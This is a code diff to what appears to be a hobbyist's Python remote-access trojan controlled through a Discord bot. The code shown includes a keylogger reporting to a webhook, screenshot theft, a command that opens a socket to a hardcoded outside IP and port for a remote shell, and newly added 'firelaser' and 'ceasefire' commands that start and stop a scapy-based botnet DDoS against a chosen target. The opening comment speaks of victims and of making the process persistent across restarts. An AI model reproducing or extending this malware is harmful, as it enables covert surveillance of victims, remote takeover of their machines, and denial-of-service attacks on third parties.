@@ -6,12 +6,13 @@ code is ever leaked. Basic backdoor control will be provided at this level and u
 initiate more complex functionality. Depending how deep i go down this rabbit hole i might add this process to victim
 startup file to make it persistent through restarts. may also implement a botnet ddos command which will be illegal to
 test so probably wont end up doing that unless im interested in crashing my own internet. EDIT# added new commands and
-threading support for keylogger.
+threading support for keylogger. :D
 """
 #Written and designed by Stone Preheim
 from discord.ext import commands
 from Client import Client
 from Keylogger import Keylogger
+from PacketGenerator import PacketGenerator
 import sys
 import discord
 import getpass
@@ -31,6 +32,8 @@ closeDDOS = True
 closeLogger = True
 controllerVersion = "V1.1"
 keyListener = Keylogger(10, 'discord', botID) #creating keylogger object to hold reference too
+packetGen = PacketGenerator()
+dosThread = threading.Thread(target=packetGen.attackLoop, args=()).start()#run forever control attack with methods on the object
 loggerThread = threading.Thread(target=keyListener.mainLoop, args=()).start() #need reference to logging thread so it doesnt keep making more. not doing this for socket since i could want more than one shell at a time.
 #May not implement this in the end as there is no reasonable reason to do this for demo purposes.
 #Might do it anyways because it'd be cool.
@@ -96,7 +99,7 @@ async def servsoc(ctx, IP="23.123.182.6", PORT=7771):
         threading.Thread(target=Client.connectToServer, args=(IP, PORT)).start()
         await ctx.send(f"Bot {botID} has opened a new socket to {IP}:{PORT} its time for anarchy!")
 
-#command for starting keylogger to report new keys every 60 seconds:
+#command for starting keylogger to report new keys every INTERVAL seconds:
 @bot.command("startlog")
 async def startlog(ctx):
     global activated, keyListener
@@ -112,6 +115,7 @@ async def stoplog(ctx):
         keyListener.stopReading()# Much more graceful than killing thread.
         await ctx.send(f"{botID} has stopped listening...")
 
+#sets the interval for the keylogger to send messages to the webhook
 @bot.command("setint")
 async def setint(ctx, interval=10):
     global activated
@@ -138,14 +142,18 @@ async def ss(ctx):
         cv2.imwrite('secretsauce.png', pic)
         await ctx.send(file=discord.File('secretsauce.png'))
 
-#command to start entire botnet ddos at target, might implement this with scapy
+#command to start entire botnet ddos at target, implemented this with scapy
 @bot.command("firelaser")
-async def fireLaser(ctx, TARGET, TPORT):
+async def fireLaser(ctx, TARGET, TPORT=80):
+    global packetGen
+    packetGen.startAttack(TARGET, TPORT)
     await ctx.send(f"{botID} has started attack on {TARGET}:{TPORT}")
 
-#command to stop entire botnet ddos at target, might implement this with scapy
+#command to stop entire botnet ddos at target, implemented this with scapy
 @bot.command("ceasefire")
 async def ceaseFire(ctx):
+    global packetGen
+    packetGen.stopAttack()
     await ctx.send(f"{botID} has stopped attack")
 
 #command to have application delete itself.
